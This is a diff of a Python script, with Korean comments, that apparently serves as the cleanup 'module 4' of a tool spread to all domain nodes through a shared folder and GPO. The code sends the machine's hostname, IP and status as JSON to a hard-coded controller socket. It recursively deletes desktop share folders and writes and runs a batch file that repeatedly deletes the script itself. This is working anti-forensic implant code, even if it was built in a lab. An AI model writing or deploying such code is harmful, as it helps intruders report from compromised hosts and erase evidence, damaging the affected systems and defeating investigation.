@@ -1,14 +1,14 @@
-#공유 폴더에서 모든 노드에서 실행하도록 설정되어있음.
-#모듈1에게 성공적으로 실행되었음을 전송
-#모든 관련파일 삭제(무한루프)
-    #GPO
-    #모듈2
-    #모듈3
-    #기타 부산물
-#배치파일 생성(%temp% 경로에)
-    #모듈4 삭제
-    #공유폴더 삭제
-    #자가삭제
+# 공유 폴더에서 모든 노드에서 실행하도록 설정되어있음.
+# 모듈1에게 성공적으로 실행되었음을 전송
+# 모든 관련파일 삭제(무한루프)
+# GPO
+# 모듈2
+# 모듈3
+# 기타 부산물
+# 배치파일 생성(%temp% 경로에)
+# 모듈4 삭제
+# 공유폴더 삭제
+# 자가삭제
 
 import os
 from re import A
@@ -19,20 +19,27 @@ import subprocess
 import urllib.request
 import socket
 import threading
+import json
 
-#사용자 이름 획득
+# 사용자 이름 획득
 c = getpass.getuser()
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 e = s.getsockname()[0]
-#현재 실행 중인 파일
+# 현재 실행 중인 파일
 dri = "moduletest.py"
-#정보들
+# 정보들
 info_List = []
+m_dict = {'NAME': '', 'IP': '', 'INFO': ''}
+hostname = subprocess.check_output(['hostname'])
+hostname = hostname.decode('utf-8')
+hostname = hostname.replace('\n', '')
 
 # 1. 통신 모듈
+
+
 def Socket_Create():
-    Host = '192.168.56.1'
+    Host = '192.168.0.133'
     Port = 9999
 
     global Client_Socket
@@ -43,25 +50,21 @@ def Socket_Create():
     receive_thread = threading.Thread(target=info_send)
     receive_thread.start()
 
+
 def info_send():
     print('info_send start')
+    m_dict['NAME'] = hostname
+    m_dict['IP'] = e
+    m_dict['INFO'] = make_List(info_List)
     while True:
         try:
-            msg = Client_Socket.recv(1024).decode('ascii')
-            if msg == 'MODULENAME':
-                Client_Socket.send(c.encode('ascii'))
-                print('send MODULENAME')
-            elif msg == 'MODULEIP':
-                Client_Socket.send(e.encode('ascii'))
-            elif msg == 'M_INFOLIST':
-                info_Lists = make_List(info_List)
-                Client_Socket.send(info_Lists.encode('ascii'))
-            else:
-                print(msg)
+            Client_Socket.sendall(json.dumps(m_dict).encode('ascii'))
         except Exception as error:
-            print("Error!",error)
+            print("Error!", error)
             Client_Socket.close()
             break
+
+
 def make_List(info_List):
     info_Lists = '[M4]\n'
     for info_name, info_state in info_List:
@@ -70,43 +73,45 @@ def make_List(info_List):
     return info_Lists
 
 # 2. 삭제 루프
+
+
 def file_delete():
     try:
         dir_path0 = "C://users/{}/desktop/share1".format(c)
         dir_path1 = "C://users/{}/desktop/share2".format(c)
         dir_path2 = "C://users/{}/desktop/share3".format(c)
         dir_path3 = "C://users/{}/desktop/share4".format(c)
-        
+
         if os.path.exists(dir_path0):
             shutil.rmtree(dir_path0)
-            shutil.rmtree(dir_path1) 
+            shutil.rmtree(dir_path1)
             shutil.rmtree(dir_path2)
             shutil.rmtree(dir_path3)
 
         else:
             if os.path.exists(dir_path1):
-                shutil.rmtree(dir_path1) 
-                #shutil.rmtree(dir_path2)
-                #shutil.rmtree(dir_path3)
-                
+                shutil.rmtree(dir_path1)
+                # shutil.rmtree(dir_path2)
+                # shutil.rmtree(dir_path3)
+
             else:
                 if os.path.exists(dir_path2):
                     shutil.rmtree(dir_path2)
                     shutil.rmtree(dir_path3)
-                    
+
                 else:
                     if os.path.exists(dir_path3):
                         shutil.rmtree(dir_path3)
 
         print("all clear")
-        info_List.append(('all clear','Ok'))
+        info_List.append(('all clear', 'Ok'))
     except:
-        info_List.append(('all clear','No'))
+        info_List.append(('all clear', 'No'))
 
 
 # 3. 자가 삭제
 def self_delete():
-    f=open("C:\\users\\{}\\desktop\\killfile.bat".format(c), 'w')
+    f = open("C:\\users\\{}\\desktop\\killfile.bat".format(c), 'w')
     f.write(":Repeat\n")
     f.write("del /f /s /q {}\n".format(dri))
     f.write("if exist {} goto Repeat\n".format(dri))
@@ -114,12 +119,13 @@ def self_delete():
     f.close()
 
     os.startfile('C:\\users\\{}\\desktop\\killfile.bat'.format(c))
-    info_List.append(('self delete','Ok'))
+    info_List.append(('self delete', 'Ok'))
+
 
 # 4. 메인 함수
-#통신모듈()
+# 통신모듈()
 file_delete()
-#self_delete()
+# self_delete()
 Socket_Create()
 
 # 부산물 리스트 받아야함. 파일명까지 경로는 배경화면 고정
